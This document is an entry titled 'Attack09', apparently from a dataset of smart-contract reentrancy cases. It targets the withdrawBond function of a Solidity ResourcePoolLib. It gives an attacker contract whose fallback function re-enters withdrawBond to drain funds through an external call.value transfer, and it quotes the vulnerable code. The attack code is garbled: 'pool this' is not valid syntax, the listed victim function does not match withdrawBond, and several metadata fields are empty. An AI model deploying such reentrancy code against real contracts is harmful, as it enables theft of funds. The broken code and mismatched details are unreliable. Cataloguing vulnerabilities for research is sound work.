# Attack09

### Contract Name:

ResourcePoolLib (test110.sol)

### Contract Address:



### Transaction Count:



### Involved Ethers:



### Length of the Call Chain: 

1 external function

### Victim Function:

`eT(address,uint256,uint256)`

### Attack Mechanism:

Attack code:

```javascript
contract Attack is UacCrowdsale{
    ResourcePoolLib r = new ResourcePoolLib();
    constructor() payable {}

    function startAttack() public {   // Disguised attack function
        //victim.call.value(1 eth)(bytes4(keccak256("contribution(uint256)")), 10);
        r.withdrawBond(pool this, 10, 10);
    }
    function() payable {
         r.withdrawBond(pool this, 10, 10);
    }
    function getvalue() returns (uint) {
        return this.balance;
    }
}
contract Pool {

}

```

Attacked code:

```javascript
contract ResourcePoolLib {
    ...
        function withdrawBond(Pool storage self, address resourceAddress, uint value, uint minimumBond) public {
                /*
                 *  Only if you are not in either of the current call pools.
                 */
                // Prevent underflow
                if (value > self.bonds[resourceAddress]) {
                        throw;
                }

                // Do a permissions check to be sure they can withdraw the
                // funds.
                if (isInPool(self, resourceAddress)) {
                        if (self.bonds[resourceAddress] - value < minimumBond) {
                            return;
                        }
                }

                deductFromBond(self, resourceAddress, value);
                if (!resourceAddress.send(value)) {
                        // Potentially sending money to a contract that
                        // has a fallback function.  So instead, try
                        // tranferring the funds with the call api.
                        if (!resourceAddress.call.gas(msg.gas).value(value)()) {
                                // Revert the entire transaction.  No
                                // need to destroy the funds.
                                throw;
                        }
                }
        }
    ...
}
```
In this case, the goal of our reentrancy is `resourceAddress.call.gas(msg.gas).value(value)()` Attacker  can taint `resourceAddress` then `withdrawBond` funciton is vulnerable.
**Attack.** The attacker call `startAttack()` to taint and attack `withdrawBond` function.